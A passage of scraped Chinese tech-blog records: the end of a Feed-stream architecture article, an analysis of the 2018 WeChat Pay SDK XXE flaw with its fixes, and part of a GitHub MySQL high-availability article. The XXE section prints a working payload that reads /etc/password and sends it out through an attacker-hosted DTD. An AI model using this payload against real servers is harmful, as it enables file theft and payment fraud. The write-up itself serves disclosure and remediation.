Feed 流，有这样一个明确经验可以帮助你快速做出决定。,\n,另外，上面说的千万日活，并不是说就是拉模型的上限，而是说，如果你做到千万日活，你将会有丰富的实践经验帮助你走下一步，那时也会有更多的资源让你使用，是继续深挖拉模型潜能，还是上推拉结合消灭性能问题，将是另外一个够挑战的问题了。,\n,\n,推模型的原罪,\n,\n,上一节我的描述有些极端，本意上我是想给出更明确的实践结论，因为对于推拉模型的积累对比已经够多了，现在难的似乎是做决定时的信心。那这一节，我就来聊推模型的几个问题。,\n,耗存储,。推模型可以理解为给每个粉丝维护一个单独的存储，举例来说，如果某个大 V 有一千万粉丝，他发的一条内容，将被存储一千万份，这个存储放大是非常可观的。于是这里就会常见的问题：一、有多少存储资源能用，这些资源贵不贵？二、如果省掉这些资源存储，响应时间性能到底能打多少折扣，这些折扣值不值？这是个时间和空间的冲突，程序员每天都在做这种问题的衡量，每个系统的要求基准也不一样，我就不妄下结论了。,\n,写峰值。,推模型有一个写峰值的问题，通常，我们做推模型，给粉丝写数据的时候一般是离线的，也就是大 V 发布完内容，触发离线写任务推给各个粉丝。可大 V 是少数，大部分时候，都是普通用户在发布，写任务没有那么多，这时，离线写任务的 worker 数可能用不了几个，可一旦大 V 发布了内容，这个写任务会骤增，突然来一个大峰值，如何处理这个峰值是个问题。有些方案：一、把资源调度系统做的超级棒，worker 数量自动化跟着调整，峰值来了的时候，worker 自动迅速扩容，消费离线任务，并在离线任务处理完毕之后缩容，避免资源浪费，这个调度确实需要很棒，因为大多时候，Feed 流对这些任务的要求是很严苛的，比如，产品上希望粉丝至少也是在分钟级看到大 V 发的内容，甚至秒级，这对调度系统的挑战是巨大的。二、推拉结合，大 V 走拉模型逻辑，这个方案的问题就是，你其实做了两套系统，开发成本大。,\n,避不开的业务逻辑。,这一点是从业务逻辑开发上来说的，这个也是在具体业务开发过程中推模型让人觉得很难受的点，就是：当我解决很多问题之后，从业务逻辑开发层面，我还是避不开很多业务逻辑。为什么这么说呢，就是在推模型里，每个粉丝都存有一个属于他的数据，但这部分数据在接口设计和数据返回上，也仅仅就是元数据，这份元数据，还是要经过很多处理才能返回给用户，比如过滤、Format，我们希望推模型维护的那个存储是一份尽可能干净的数据，但事情却没那么简单。,\n,不过，以上是我个人的一些总结，由于在推模型上我没有走的更远，这些问题到底是不是真正的问题，欢迎来喷。,\n,0x03 关于数据,\n,模型的事情就不过多说了，再来聊几个关于数据的具体问题。,\n,\n,有状态与无状态,\n,\n,这是 Feed 流的 API 接口设计相关的问题。,\n,举个例子，在拉取 Feed 流数据时候， API 层面基于数量 offset/limit 的分页方案是完全不行的，因为用户 Feed 流的新数据会 insert 到流最开始位置，仅仅给出 offset 会导致分页数据错乱，所以会给出一种 after/limit 的分页方案，就是有一个标志数据，意义是“从 after 这个数据向后取 limit 条数据”；但是，这仅仅是一个干净的 Feed 流的情况下，在实际的业务需求中，Feed 流中的数据会更复杂，复杂到打乱这个看起来可行的分页方式。,\n,以分页这个例子来说，它为什么会这么脆弱呢? 我总结是因为 API 的数据请求是无状态的，用户在取第二页数据的时候，并不知道取第一页数据时到底发生了什么，仅仅知道在接口层面传递的几个值（offset/after/limt），而许多时候尤其是对于 Feed 流的一些时候这些值不够用，导致数据拉取变得棘手。,\n,所以，如果 Feed 流的数据获取是有状态就好了，就像浏览器与服务器之间的 Session，保持用户一个访问周期的上下文数据，这样想做什么就都好做了。,\n,\n,数据 Format,\n,\n,通常，Feed 流中的数据会来自多个不同的源，最后返回给用户之前需要做数据的 Format，这个过程是个性能黑洞，经常包含了很多 IO，你可能要读大量存储，读大量 RPC来获取到数据才能成功组装。所以针对数据 Format 有很多性能优化的点，包括不限于：消灭慢查询、减少调用放大、并行获取数据、做好缓存、操作批量。,\n,要做好性能优化，好的结构是必需的，比如要减少调用放大，那就要尽量保证数据复用和批量获取，只有你的代码结构好，才会有更合适的地方去获取数据和复用数据；也同样，只有你把可以并行部分都很清晰的摘离出来了，才能更合适地去做统一并行。,\n,而诸如消灭慢查询、做好缓存，此类其他细节也都是重要的，这里就不展开。,\n,\n,过滤,\n,\n,几乎所有的 Feed 流都有过滤需求，比如对已经读过的内容进行过滤，或者对已经被作者删除的内容进行过滤。,\n,过滤是个具体的事情，有的时候你仅仅需要元数据就能过滤，有的时候你需要对拿到完整数据才能过滤。总结一句话就是过滤的繁琐与否取决于产品需求，但好的结构可以让过滤变得更符合逻辑，性能表现更好。,\n,0x04 结语,\n,Feed 流是个不小的系统，三言两语只是管中窥豹，长时间没写分享文章了行文也变得不太流畅，希望看完这篇你会有所收获吧。,\n,\n\r\n        \r\n            ,\n        ,打赏支持我写出更多好文章，谢谢！,\n        , 打赏作者,\n    ,\n\n    ,\n        ,打赏支持我写出更多好文章，谢谢！,\n                ,任选一种支付方式,\n                ,\n                        ,\n            \n                            ,\n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,v7,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            微博：@_v7__        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 17, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114156/", "url_object_id": "7b4b289d21745010a22e3afbfc59d82c", "front_image_path": "full/eb63456a872d5c2ffd8306369d8fe47503161e04.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/09/3fb6592ac92133a71f0ae78e43683e83.jpg"], "title": "谈谈微信支付曝出的漏洞", "create_time": "2018/07/06", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,编程迷思,   ,一、背景,\n,昨天（2018-07-04）微信支付的SDK曝出重大漏洞（XXE漏洞），通过该漏洞，攻击者可以获取服务器中目录结构、文件内容，如代码、各种私钥等。获取这些信息以后，攻击者便可以为所欲为，其中就包括众多媒体所宣传的“0元也能买买买”。,\n,漏洞报告地址；http://seclists.org/fulldisclosure/2018/Jul/3,\n,二、漏洞原理,\n,1.  XXE漏洞,\n,此次曝出的漏洞属于XXE漏洞，即XML外部实体注入（XML External Entity Injection）。,\n,XML文档除了可以包含声明和元素以外，还可以包含文档类型定义（即DTD）；如下图所示。,\n,\n,在DTD中，可以引进实体，在解析XML时，实体将会被替换成相应的引用内容。该实体可以由外部引入(支持http、ftp等协议，后文以http为例说明)，如果通过该外部实体进行攻击，就是XXE攻击。,\n,可以说，,XXE漏洞之所以能够存在，本质上在于在解析XML的时候，可以与外部进行通信；当XML文档可以由攻击者任意构造时，攻击便成为可能。,在利用XXE漏洞可以做的事情当中，最常见最容易实现的，便是读取服务器的信息，包括目录结构、文件内容等；本次微信支付爆出的漏洞便属于这一种。,\n,2.  微信支付漏洞,\n,本次漏洞影响的范围是：在微信支付异步回调接口中，使用微信支付SDK进行XML解析的应用。注意这里的SDK是服务器端的SDK，APP端使用SDK并不受影响。,\n,SDK下载地址如下（目前微信官方宣传漏洞已修复）：https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip,\n,SDK中导致漏洞的代码是WXPayUtil工具类中的xmlToMap()方法：,\n,\n,如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。,\n,3.  攻击复现,\n,下面在本机环境下进行复现。,\n,假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。,\n,攻击时构造的请求如下：,\n,\n,其中xml内容如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<!DOCTYPE root [\r\n    <!ENTITY % file SYSTEM \"file:///etc/password\">\r\n    <!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\">\r\n    %xxe;\r\n]>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<?,xml ,version,=,\"1.0\", ,encoding,=,\"utf-8\",?>,<,!,DOCTYPE ,root, ,[,    ,<,!,ENTITY, ,%, ,file ,SYSTEM, ,\"file:///etc/password\",>,    ,<,!,ENTITY, ,%, ,xxe ,SYSTEM, ,\"http://127.0.0.1:9000/xxe.dtd\",>,    ,%,xxe,;,],>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<!ENTITY % shell \"<!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'>\">\r\n%shell;\r\n%upload;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,!,ENTITY, ,%, ,shell, ,\"<!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'>\",>,%,shell,;, ,%,upload,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：,\n,http://127.0.0.1:9000/evil/password1234,\n,这样，攻击者便得到了/etc/password文件的内容。,\n,在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。,\n,三、漏洞的解决,\n,解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。,\n,漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：,\n,\n,加入了如下两行代码：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,documentBuilderFactory,.,setExpandEntityReferences,(,false,),;,documentBuilderFactory,.,setFeature,(,XMLConstants,.,FEATURE_SECURE_PROCESSING,,, ,true,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,documentBuilderFactory,.,setFeature,(,\"http://apache.org/xml/features/disallow-doctype-decl\",,, ,true,),;,documentBuilderFactory,.,setFeature,(,\"http://xml.org/sax/features/external-general-entities\",,, ,false,),;,documentBuilderFactory,.,setFeature,(,\"http://xml.org/sax/features/external-parameter-entities\",,, ,false,),;,documentBuilderFactory,.,setFeature,(,\"http://apache.org/xml/features/nonvalidating/load-external-dtd\",,, ,false,),;,documentBuilderFactory,.,setFeature,(,XMLConstants,.,FEATURE_SECURE_PROCESSING,,, ,true,),;,documentBuilderFactory,.,setXIncludeAware,(,false,),;,documentBuilderFactory,.,setExpandEntityReferences,(,false,),;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：,\n,https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5,\n,笔者本人使用上述方案中建议的如下代码修复了该漏洞：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,DocumentBuilderFactory ,documentBuilderFactory, ,=, ,DocumentBuilderFactory,.,newInstance,(,),;,documentBuilderFactory,.,setFeature,(,\"http://apache.org/xml/features/disallow-doctype-decl\",,, ,true,),;,DocumentBuilder ,documentBuilder, ,=, ,documentBuilderFactory,.,newDocumentBuilder,(,),;,……,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,四、扩展与反思,\n,1.  危害不只是“0元也能买买买”,\n,在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。,\n,然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。,\n,2.  漏洞不限于微信支付SDK,\n,虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：,\n,（1）接口使用xml做请求参数,\n,（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口),\n,（3）接口中解析xml参数时，没有禁用对外部实体的访问,\n,建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。,\n,3.  xml与json,\n,xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。,\n,4.  题外话：微信支付的签名认证,\n,在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。,\n,在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。,\n,参考文献,\n,https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5,\n,http://seclists.org/fulldisclosure/2018/Jul/3,\n,https://www.cnblogs.com/tongwen/p/5194483.html,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114197/", "url_object_id": "f2c4471ed0ef1f9a2f5eb6a1621f2f3b", "front_image_path": "full/9a51fcef743ae4aca8b8c39bcc18e02a01782e9c.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "title": "GitHub 的 MySQL 高可用性实践分享", "create_time": "2018/07/09", "vote": "2", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,shlomi-noach ,   译文出处：,oschina,   ,\n,GitHub 使用 MySQL 作为所有非 git 仓库数据的主要存储, 它的可用性对 GitHub 的访问操作至关重要。GitHub 站点本身、GitHub 的 API、身份验证等等都需要进行数据库访问。我们运行着多个 MySQL 集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置, 主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改, 并提供数据的读取服务。,\n,主节点的可用性尤为重要。没有主服务器, 集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。,\n,为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。,\n,在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。,\n,本文将介绍 GitHub 的 MySQL 高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。,\n,高可用目标,\n,本文描述的解决方案，迭代并改进了之前在 GitHub 实现的高可用(HA)解决方案。随着规模的扩大，MySQL 的高可用策略必须适应变化。我们希望为 GitHub 中的 MySQL 和其他服务，提供类似的高可用策略。,\n,在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：,\n,\n,你能容忍多长的中断时间？,\n,崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？,\n,故障转移的可靠性如何？什么情况下可以失败？,\n,解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？,\n,解决方案是否允许一个完整的数据中心故障或者出现网络隔离？,\n,有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。,\n,你能允许数据丢失吗？在多大程度上？,\n,\n,为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。,\n,移除基于 VIP 和 DNS 的服务发现,\n,在之前的迭代版本中，我们：,\n,\n,使用 ,orchestrator, 来做检测和故障转移,\n,使用 VIP 和 DNS 做主节点的发现,\n,\n,在这个迭代版本中，客户端使用名字服务（比如 mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟 IP(VIP)，这个 VIP 指向主节点。,\n,因此，在正常情况下，客户端只需要解析名称，连接到解析后的 IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。,\n,考虑这个跨越三个不同数据中心的复制拓扑：,\n,\n,当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。,\n,orchestrator 将会检测到故障，选举出一个新的主节点，然后重新分配 name（名称）和 VIP（虚拟 IP）。客户端实际上并不知道主节点的真实身份：它们只知道 name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：,\n,VIP 是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放 VIP，服务器必须发送 ARP 请求。拥有 VIP 的服务器必须在新提升的主节点获得 VIP 之前先释放掉。这还有一些额外的影响：,\n,\n,有秩序的故障转移操作会首先通知故障主节点并要求它释放 VIP，然后再通知新提升的主节点并要求它获取 VIP。如果无法通知到原主节点或者拒绝释放 VIP 怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。\n,\n,我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个 VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。,\n,事实源于两个独立服务器间的协作，并且这个设置是不可靠的。,\n,\n,\n,即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。,\n,即使 VIP 发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。,\n,\n,VIP 受限于物理位置。它们属于交换机或者路由器。所以，我们只能将 VIP 重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配 VIP，只能修改 DNS。,\n,\n,修改 DNS 需要较长的传播时间。根据配置，客户端会缓存 DNS 一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。,\n,\n,仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：,\n,\n,主节点通过 pt-heartbeat 心跳服务进行自行注入，目的是,测量延迟和节流,。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。,\n,同样的，,Pseudo-GTID, 注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。,\n,新的主节点被设为可写。如果可能的话，原主节点被设为只读。,\n,\n,这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。,\n,该解决方案生效了，GitHub 已经成功完成 MySQL 的故障迁移，但我们希望我们的 HA 在以下方面有所改进：,\n,\n,数据中心不可知,\n,允许数据中心出现故障,\n,删除不可靠的协作工作流,\n,减少总的中断时间,\n,尽可能地进行无损故障转移,\n,\n,GitHub 的高可用解决方案：orchestrator, Consul, GLB,\n,我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：,\n,\n,使用 ,orchestrator, 来做监测和故障转移。我们使用跨数据中心的 ,orchestrator/raft, 方案，如下图。,\n,使用 Hashicorp 的 ,Consul, 来做服务发现。,\n,使用 ,GLB/HAProxy, 作为客户端和写节点的代理层。,\n,使用选播(anycast)做网络路由。,\n,\n,\n,新的设置将完全删除 VIP 和 DNS 的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。,\n,正常流程,\n,正常情况下，应用程序通过 GLB/HAProxy 连接到写节点。,\n,应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1 的主节点命名为 mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(,anycast,) IP。,\n,使用选播时，名字在任何地方都被解析为相同的 IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有 GLB（我们的高可用负载均衡）被部署在不同的容器中。指向 mysql-writer-1.github.net 的流量总是路由到本地数据中心的 GLB 集群。因此，所有客户端都由本地代理提供服务。,\n,我们在 ,HAProxy, 上运行 GLB。我们的 HAProxy 维护了一个写连接池：每个 MySQL 集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC 中的所有 GLB/HAProxy 容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入 mysql-writer-1.github.net，它连接到哪个 GLB 服务器并不重要。它总会被路由到实际的 cluster1 主节点上。,\n,对于应用程序而言，服务发现结束于 GLB，并且不再需要重新发现。就这样，通过 GLB 将流量路由到正确地址。,\n,GLB 如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到 GBL 呢？,\n,Consul 的服务发现,\n,Consul 是著名的服务发现解决方案，它也提供 DNS 服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。,\n,在 Consul 的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主 FQDN，端口，IPV4，IPV6。,\n,每一个 GLB/HAProxy 节点都运行 consul 模板：每一个服务都在监听 consul 数据的变更（这里主要是对集群主控的数据变更）。consul 模板会生成一个有效的配置文件并且当配置变更时，能够自动重载 HAProxy。,\n,因此，Consul 中主控标识的变更会被每一个 GLB/HAProxy 观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。,\n,在 GitHub 中，每一个数据中心都有一个 Consul 设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。,\n,那么 Consul 是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？,\n,orchestrator/raft,\n,运行一个 orchestrator/raft 设置：orchestrator 节点之间通过 raft 一致性算法进行通信。每一个数据中心有 1~2 个 orchestrator 节点。,\n,orchestrator 负责失败检测，MySQL 故障转移，以及 Consul 主控的变更通知。故障转移通过单个 orchestrator/raft 主导节点进行操作，但是对于主控变更，产生新主控的消息会通过 raft 机制被传播到所有 orchestrator 节点。,\n,一旦 orchestrator 节点接收到主控变更的消息，它们会与自己对应的本地 Consul 设置通信：它们都执行 KV 写操作。具有多个 orchestrator 节点的数据中心会有多个完全相同的 Consul 写操作。,\n,整体流程,\n,在主节点故障的场景中：,\n,\n,orchestrator 节点检测到故障。,\n,orchestrator/raft 主导节点开始恢复。一个新的主节点被设置为 promoted 状态。,\n,orchestrator/raft 向所有 raft 集群节点通知主节点变更。,\n,所有 orchestrator/raft 成员接收到主节点变更的通知。每个成员都向本地 Consul 写入包含新主节点身份的 KV 记录。,\n,每个 GLB/HAProxy 都运行一个 consul 模版，用于监视 Consul KV 存储的变化，并重新配置和重新加载 HAProxy。,\n,客户端流量被重定向到新的主节点上。,\n,\n,每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator 不需要知道负载均衡。Consul 不需要知道这些信息是从哪里来的。代理只关心 Consul，客户端只关心代理。,\n,而且：,\n,\n,没有 DNS 的变更需要传播。,\n,没有 TTL。,\n,整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。,\n,\n,其他细节,\n,为了进一步确保流程的安全，我们还提供了以下内容：,\n,\n,将 HAProxy 的配置项 hard-stop-after 设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。\n,\n,通过使用 hard-stop-after 配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。,\n,\n,\n,我们并不严格要求 Consul 随时可用。实际上，我们只需要它在故障转移期间可用。如果 Consul 恰好这时不可用，GLB 将继续使用已知的信息运作，不采用任何极端的行动。,\n,GLB 被用于验证新提升的主节点的身份。类似于我们的 ,context-aware MySQL pools,（上下文感知的 MySQL 线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在 Consul 中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在 Consul 中错误的写入了一个非主节点的名称，没有问题；GLB 将拒绝更新它并以最后已知的状态继续运行。,\n,\n,我们会在以下章节进一步完成备受关注和期望的高可用目标。,\n,orchestrator/raft 失败检测,\n,orchestrator使用,全面方法,来检测失败，因此这种方法非常可靠。我们不会观察到误报 —— 因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。,\n,通过完全的 DC 网络隔离（又称 DC 栅栏），orchestrator/raft 进一步处理这个问题。一个 DC 网络隔离会引起一些混淆：这个 DC 中的服务器是可以互相通信的。他们是与其他 DC 网络隔离，还是其他 DC 被网络隔离？,\n,在一个 orchestrator/raft 设置中，raft 的 leader 节点就是运行故障转移的那个节点。leader 是取得了大多数节点支持的节点（特定数量）。我们的 orchestrator 节点部署就是这样，没有单一数据中心可以占大多数，任何 n-1 的 DC 也是如此。,\n,在一个完全 DC 网络隔离的事件中，这个 DC 的 orchestrator 节点与其它 DC 中的对应节点失去连接。最终，隔离 DC 中的 orchestrator 节点不能作为 raft 集群的 leader 节点。如果任何这种节点碰巧成为了 leader 节点，它就会退出。一个新的 leader 节点可以从任何一个其他 DC 分配。leader 节点会得到其他所有 DC 的支持，这些 DC 彼此之间可以进行通信。,\n,因此，调用 shots 的 orchestrator 节点将位于网络隔离数据中心之外。一个隔离 DC 应该有一个主服务器，orchestrator 会使用可用 DC 中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离 DC 中的那些节点来做这个决定，以此来缓解 DC 隔离。,\n,更快的公告,\n,通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？,\n,当 orchestrator 